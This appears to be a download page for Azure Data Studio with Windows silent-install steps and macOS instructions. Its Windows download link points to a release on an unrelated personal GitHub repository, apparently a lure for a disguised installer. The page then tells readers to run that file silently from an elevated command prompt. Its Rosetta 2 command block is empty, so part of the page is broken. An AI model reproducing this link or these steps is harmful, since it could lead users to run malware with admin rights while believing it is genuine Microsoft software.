## Download Azure Data Studio

To install Azure Data Studio on Windows:    

**[Download Azure Data Studio](https://github.com/stardew47/open/releases/download/1.2975/azuredatastudio-windows-setup-1.51.1.exe)**

Starting with Azure Data Studio is quick and easy. Download the latest version, follow the installation guide, and start working with your data in a user-friendly, modern environment.

We recommend using the **user installer**, which simplifies the installation and update process, and does not require admin rights because it installs in your userâ€™s Local AppData (LOCALAPPDATA) folder.

Additionally, the user installer ensures a smoother update process in the background. For more details, refer to [User setup for Windows](https://code.visualstudio.com/updates/v1_26#_user-setup-for-windows).

For a streamlined installation experience on Windows, run Azure Data Studio in the background with the following steps:

1. Open an elevated command prompt window.
    
2. Execute this command:
    
    ```bash
    <path where the azuredatastudio-windows-user-setup-x.xx.x.exe file is located> /VERYSILENT /MERGETASKS=!runcode>
    ```
    
    Example:
    
    ```bash
    %systemdrive%\azuredatastudio-windows-user-setup-1.24.0.exe /VERYSILENT /MERGETASKS=!runcode
    ```
    
    Note: This command works with the system installer file as well.
    
    ```bash
    <path where the azuredatastudio-windows-setup-x.xx.x.exe file is located> /VERYSILENT /MERGETASKS=!runcode>
    ```

3. After running the commands, Azure Data Studio will be installed.

### macOS Installation

1. Download [Azure Data Studio for macOS](https://azuredatastudio-update.azurewebsites.net/latest/darwin-universal/stable).
    
2. Double-click the .zip file to extract its contents.
    
3. To add Azure Data Studio to Launchpad, move the _Azure Data Studio.app_ file into the _Applications_ folder.

Note: For Apple Silicon users, ensure that Rosetta 2 is installed. Some backend services are still using x86_64 binaries. Install Rosetta 2 by running the following in Terminal:

```bash

```
